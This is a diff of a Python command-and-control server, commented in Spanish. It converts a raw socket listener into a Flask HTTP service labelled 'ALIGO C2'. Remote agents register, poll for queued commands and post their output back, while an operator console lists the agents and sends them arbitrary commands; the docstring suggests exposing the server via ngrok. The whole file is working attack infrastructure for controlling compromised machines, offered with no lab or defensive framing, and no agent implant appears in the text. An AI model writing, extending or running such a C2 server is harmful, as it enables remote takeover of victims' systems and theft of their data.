@@ -1,82 +1,130 @@
 """
-Servidor C2 - Nivel 1/2
-Acepta conexiones de múltiples agentes, permite al operador
+Servidor C2 - HTTPS Version
+Acepta conexiones de múltiples agentes vía HTTP/HTTPS, permite al operador
 elegir un agente y mandarle comandos, recibe y muestra resultados.
 
-Protocolo: JSON, un mensaje por línea (newline-delimited JSON).
+Protocolo: HTTP con JSON (REST API).
+Compatible con ngrok: ngrok http 5000
 """
 
-import socket
+from flask import Flask, request, jsonify
 import threading
 import json
 import uuid
 import os
 import sys
+import time
+from datetime import datetime
 
 HOST = "0.0.0.0"
-PORT = int(os.getenv("PORT", 4444))  # Puerto configurable vía variable de entorno
+PORT = int(os.getenv("PORT", 5000))  # Puerto configurable vía variable de entorno
 
-# Diccionario de agentes conectados: {agent_id: socket}
+app = Flask(__name__)
+app.config['JSON_SORT_KEYS'] = False
+
+# Diccionario de agentes conectados: {agent_id: info}
 agents = {}
 agents_lock = threading.Lock()
 
+# Cola de comandos pendientes por agente: {agent_id: [comandos...]}
+pending_commands = {}
 
-def send_json(sock, data: dict):
-    """Envía un dict como JSON terminado en newline."""
-    msg = json.dumps(data) + "\n"
-    sock.sendall(msg.encode())
-
-
-def recv_json(sock, buffer: str):
-    """
-    Lee del socket hasta tener al menos un mensaje completo (newline).
-    Devuelve (mensaje_dict_o_None, buffer_restante).
-    """
-    while "\n" not in buffer:
-        chunk = sock.recv(4096)
-        if not chunk:
-            return None, buffer  # conexión cerrada
-        buffer += chunk.decode(errors="ignore")
-    line, buffer = buffer.split("\n", 1)
-    if not line.strip():
-        return {}, buffer
-    return json.loads(line), buffer
+# Resultados recibidos (opcional, para debug)
+results_history = []
 
 
-def handle_agent(conn, addr):
-    """Hilo dedicado a cada agente conectado."""
-    buffer = ""
-    agent_id = None
-    try:
-        # Esperamos el mensaje de registro inicial ("hello")
-        msg, buffer = recv_json(conn, buffer)
-        if msg and msg.get("type") == "hello":
-            agent_id = msg.get("agent_id", str(uuid.uuid4())[:8])
-            with agents_lock:
-                agents[agent_id] = conn
-            print(f"[+] Agente conectado: {agent_id} desde {addr} ({msg.get('hostname')})")
+# ============================================
+# ENDPOINTS HTTP
+# ============================================
 
-        # Loop principal: escuchar resultados que manda el agente
-        while True:
-            msg, buffer = recv_json(conn, buffer)
-            if msg is None:
-                break  # agente se desconectó
-            if msg.get("type") == "result":
-                print(f"\n[resultado de {agent_id}] (id={msg.get('id')}):")
-                print(msg.get("output"))
-                print(f"> ", end="", flush=True)  # repinta el prompt del operador
+@app.route('/checkin', methods=['POST'])
+def checkin():
+    """Agente se registra inicialmente."""
+    data = request.json
+    agent_id = data.get('agent_id', str(uuid.uuid4())[:8])
+    hostname = data.get('hostname', 'unknown')
+    os_type = data.get('os', 'unknown')
+    
+    with agents_lock:
+        agents[agent_id] = {
+            "hostname": hostname,
+            "os": os_type,
+            "last_seen": datetime.now(),
+            "ip": request.remote_addr
+        }
+        if agent_id not in pending_commands:
+            pending_commands[agent_id] = []
+    
+    print(f"\n[+] Agente conectado: {agent_id} desde {request.remote_addr} ({hostname})")
+    print("> ", end="", flush=True)
+    
+    return jsonify({"status": "ok", "agent_id": agent_id})
 
-    except (ConnectionResetError, json.JSONDecodeError) as e:
-        print(f"[!] Error con agente {agent_id}: {e}")
-    finally:
-        if agent_id:
-            with agents_lock:
-                agents.pop(agent_id, None)
-            print(f"\n[-] Agente desconectado: {agent_id}")
 
+@app.route('/poll', methods=['POST'])
+def poll():
+    """Agente pregunta si hay comandos pendientes."""
+    data = request.json
+    agent_id = data.get('agent_id')
+    
+    if not agent_id:
+        return jsonify({"error": "agent_id requerido"}), 400
+    
+    # Actualizar last_seen
+    with agents_lock:
+        if agent_id in agents:
+            agents[agent_id]['last_seen'] = datetime.now()
+        
+        # Verificar si hay comandos pendientes
+        if agent_id in pending_commands and pending_commands[agent_id]:
+            cmd = pending_commands[agent_id].pop(0)
+            return jsonify(cmd)
+    
+    return jsonify({"command": None})
+
+
+@app.route('/result', methods=['POST'])
+def result():
+    """Agente envía el resultado de un comando ejecutado."""
+    data = request.json
+    agent_id = data.get('agent_id')
+    msg_id = data.get('id')
+    output = data.get('output', '')
+    status = data.get('status', 'ok')
+    
+    # Guardar en historial (opcional)
+    results_history.append({
+        "agent_id": agent_id,
+        "id": msg_id,
+        "output": output,
+        "status": status,
+        "timestamp": datetime.now()
+    })
+    
+    # Mostrar resultado en consola
+    print(f"\n[resultado de {agent_id}] (id={msg_id}):")
+    print(output)
+    print("> ", end="", flush=True)
+    
+    return jsonify({"status": "ok"})
+
+
+@app.route('/health', methods=['GET'])
+def health():
+    """Endpoint de salud para verificar que el servidor está vivo."""
+    return jsonify({
+        "status": "ok",
+        "agents_connected": len(agents),
+        "timestamp": datetime.now().isoformat()
+    })
+
+
+# ============================================
+# CONSOLA DEL OPERADOR
+# ============================================
 
 def operator_console():
-    """Consola simple para que el operador mande comandos."""
+    """Consola interactiva para que el operador mande comandos."""
     print("Consola de operador. Comandos:")
     print("  list                  -> lista agentes conectados")
     print("  use <agent_id> <cmd>  -> manda un comando a un agente")
@@ -88,13 +136,21 @@ def operator_console():
             line = input("> ").strip()
         except EOFError:
             break
+        except KeyboardInterrupt:
+            print("\n[*] Usa 'exit' para salir")
+            continue
+
+        if not line:
+            continue
 
         if line == "list":
             with agents_lock:
                 if not agents:
                     print("(sin agentes conectados)")
-                for aid in agents:
-                    print(f" - {aid}")
+                else:
+                    for aid, info in agents.items():
+                        last_seen = info['last_seen'].strftime("%H:%M:%S")
+                        print(f" - {aid} | {info['hostname']} | {info['os']} | last_seen: {last_seen}")
 
         elif line.startswith("use "):
             parts = line.split(" ", 2)
@@ -120,33 +176,61 @@ def operator_console():
                         continue
             
             with agents_lock:
-                conn = agents.get(agent_id)
-            if not conn:
-                print(f"Agente '{agent_id}' no encontrado")
-                continue
+                if agent_id not in agents:
+                    print(f"Agente '{agent_id}' no encontrado")
+                    continue
+            
+            # Crear comando y agregarlo a la cola
             msg_id = str(uuid.uuid4())[:8]
-            send_json(conn, {"type": "cmd", "id": msg_id, "command": command})
+            cmd_obj = {
+                "type": "cmd",
+                "id": msg_id,
+                "command": command
+            }
+            
+            with agents_lock:
+                if agent_id not in pending_commands:
+                    pending_commands[agent_id] = []
+                pending_commands[agent_id].append(cmd_obj)
+            
             print(f"[enviado] id={msg_id} -> {agent_id}: {command}")
 
         elif line == "exit":
-            break
+            print("[*] Cerrando servidor...")
+            os._exit(0)
 
+        else:
+            print(f"Comando no reconocido: {line}")
+
+
+# ============================================
+# MAIN
+# ============================================
 
 def main():
-    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server_sock.bind((HOST, PORT))
-    server_sock.listen(5)
-    print(f"[*] Servidor C2 escuchando en {HOST}:{PORT}")
-
-    def accept_loop():
-        while True:
-            conn, addr = server_sock.accept()
-            t = threading.Thread(target=handle_agent, args=(conn, addr), daemon=True)
-            t.start()
-
-    threading.Thread(target=accept_loop, daemon=True).start()
-    operator_console()
+    print("=" * 60)
+    print("  ALIGO C2 - Servidor HTTPS")
+    print("=" * 60)
+    print(f"[*] Servidor HTTP escuchando en {HOST}:{PORT}")
+    print(f"[*] Usa ngrok con: ngrok http {PORT}")
+    print()
+    
+    # Iniciar Flask en un thread separado
+    def run_flask():
+        app.run(host=HOST, port=PORT, debug=False, use_reloader=False)
+    
+    flask_thread = threading.Thread(target=run_flask, daemon=True)
+    flask_thread.start()
+    
+    # Dar tiempo a Flask para iniciar
+    time.sleep(1)
+    
+    # Iniciar consola del operador en el thread principal
+    try:
+        operator_console()
+    except KeyboardInterrupt:
+        print("\n[*] Servidor detenido")
+        sys.exit(0)
 
 
 if __name__ == "__main__":
